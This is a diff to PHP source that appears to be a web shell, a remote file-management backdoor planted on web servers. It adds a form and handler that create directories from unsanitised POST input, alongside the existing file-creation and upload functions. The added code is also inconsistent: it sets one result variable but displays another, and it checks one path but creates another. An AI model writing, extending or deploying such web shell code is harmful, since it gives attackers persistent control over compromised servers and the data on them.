@@ -67,6 +67,25 @@ if (isset($_POST["mk_file"]))
 	}
 }
 
+if (isset($_POST["mk_dir"]))
+{
+	if (is_writable($cwd))
+	{
+		if (!file_exists($cwd . "/" . $_POST["mk_dir"]))
+		{
+			$result_mk_f = (mkdir($_POST["mk_dir"])) ? "[+] success: directory created" : "[-] error: directory not created";
+		}
+		else
+		{
+			$result_mk_f = "[-] error: directory already exists";
+		}
+	}
+	else
+	{
+		$result_mk_f = "[-] error: folder not writable";
+	}
+}
+
 if (isset($_FILES["upload"]))
 {
 	$target_directory = $cwd;
@@ -378,6 +397,13 @@ if ($cwd)
 </form>
 
 <?php if (isset($result_mk_f)) { show_alert($result_mk_f); } ?>
+
+<form action="<? echo($shell); ?>" method="POST">
+	<input type="text" id="mk_dir" name="mk_dir" placeholder="var" required>
+	<input type="submit" value="Make Directory">
+</form>
+
+<?php if (isset($result_mk_d)) { show_alert($result_mk_d); } ?>
 
 <form action="<? echo($shell); ?>" method="POST" enctype="multipart/form-data">
 	<label for="upload">File:</label>
